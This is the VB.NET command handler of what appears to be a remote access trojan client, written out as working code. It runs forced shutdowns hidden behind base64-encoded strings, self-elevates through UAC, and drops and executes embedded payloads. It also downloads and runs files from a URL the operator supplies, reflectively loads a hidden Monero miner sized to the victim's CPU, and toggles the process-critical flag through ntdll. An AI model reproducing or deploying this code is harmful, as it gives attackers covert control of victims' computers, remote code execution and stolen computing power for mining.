Public Class Main

    Public Shared Sub MISC(ByVal HWID As String, ByVal CMD As String)
        On Error Resume Next
        Dim A As String() = Split(CMD, "|'P'|")
        Select Case A(0)

            Case "PC"
                Select Case A(1)
                    Case "1"
                        CriticalProcesses_Disable()
                        Shell(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String("U2h1dGRvd24gL3IgL2YgL3QgMDA=")), AppWinStyle.Hide, False, -1) 'Shutdown /r /f /t 00
                    Case "2"
                        CriticalProcesses_Disable()
                        Shell(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String("U2h1dGRvd24gL3MgL2YgL3QgMDA=")), AppWinStyle.Hide, False, -1) 'Shutdown /s /f /t 00
                    Case "3"
                        CriticalProcesses_Disable()
                        Shell(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String("U2h1dGRvd24gL2wgL2Y=")), AppWinStyle.Hide, False, -1) 'Shutdown /l /f
                End Select

            Case "PRI"
                Dim runas As New Diagnostics.Process()
                runas.StartInfo.WindowStyle = Diagnostics.ProcessWindowStyle.Hidden
                runas.StartInfo.FileName = System.Windows.Forms.Application.ExecutablePath
                runas.StartInfo.UseShellExecute = True
                runas.StartInfo.Verb = "runas"
                runas.StartInfo.Arguments = ""
                runas.Start()
                CriticalProcesses_Disable()
                Environment.Exit(0)

            Case "Visit"
                Diagnostics.Process.Start(A(1))

            Case "RD-"
                Dim NewFile = IO.Path.GetTempFileName & IO.Path.GetExtension(A(1))
                IO.File.WriteAllBytes(NewFile, GZip(Convert.FromBase64String(A(2))))
                Threading.Thread.CurrentThread.Sleep(1000)
                Diagnostics.Process.Start(NewFile)

            Case "RU-"
                Dim NewFile = IO.Path.GetTempFileName + A(2)
                Dim WC As New Net.WebClient
                WC.DownloadFile(A(1), NewFile)
                Threading.Thread.CurrentThread.Sleep(1000)
                Diagnostics.Process.Start(NewFile)


            Case "XMR-R"

                For Each Type_ As Type In System.AppDomain.CurrentDomain.Load(Convert.FromBase64String(A(5))).GetTypes
                    For Each GM In Type_.GetMethods
                        If GM.Name = "XM" Then
                            If A(1).Contains("<CUS>") Then
                                GM.Invoke(Nothing, New Object() {A(1), "", "", "", ""})
                                Return
                            End If

                            If A(1) = "50%" Then
                                A(1) = Environment.ProcessorCount / 2
                            End If
                            If A(4) = "ID%" Then
                                A(4) = HWID
                            End If
                            GM.Invoke(Nothing, New Object() {A(1), A(2), A(3), A(4), HWID})
                        End If
                    Next
                Next

            Case "XMR-K"
                Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\" & HWID).SetValue("MinerXMR", "False")

                Dim objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & Environment.UserDomainName & "\root\cimv2")
                Dim colProcess = objWMIService.ExecQuery("Select * from Win32_Process")
                Dim wmiQuery As String = String.Format("select CommandLine from Win32_Process where Name='{0}'", "Regasm.exe")
                Dim searcher As Management.ManagementObjectSearcher = New Management.ManagementObjectSearcher(wmiQuery)
                Dim retObjectCollection As Management.ManagementObjectCollection = searcher.Get
                For Each retObject In colProcess
                    If retObject.CommandLine.ToString.Contains("--donate-level=") Then
                        retObject.Terminate()
                    End If
                Next

        End Select
    End Sub

    Private Shared Function GZip(ByVal B As Byte()) As Byte()
        Try
            Dim MS As New IO.MemoryStream(B)
            Dim Ziped As New IO.Compression.GZipStream(MS, IO.Compression.CompressionMode.Decompress)
            Dim buffer As Byte() = New Byte(4 - 1) {}
            MS.Position = (MS.Length - 5)
            MS.Read(buffer, 0, 4)
            Dim count As Integer = BitConverter.ToInt32(buffer, 0)
            MS.Position = 0
            Dim array As Byte() = New Byte(((count - 1) + 1) - 1) {}
            Ziped.Read(array, 0, count)
            Ziped.Dispose()
            MS.Dispose()
            Return array
        Catch ex As Exception
        End Try
    End Function

    'https://www.codeproject.com/Articles/43405/Protecting-Your-Process-with-RtlSetProcessIsCriti
    <Runtime.InteropServices.DllImport("NTdll.dll", EntryPoint:="RtlSetProcessIsCritical", SetLastError:=True)>
    Public Shared Sub SetCurrentProcessIsCritical(
                          <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> ByVal isCritical As Boolean,
                          <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> ByRef refWasCritical As Boolean,
                          <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> ByVal needSystemCriticalBreaks As Boolean)
    End Sub
    Public Shared Sub CriticalProcesses_Disable()
        Try
            Dim refWasCritical As Boolean
            SetCurrentProcessIsCritical(False, refWasCritical, False)
        Catch ex As Exception
        End Try
    End Sub

End Class
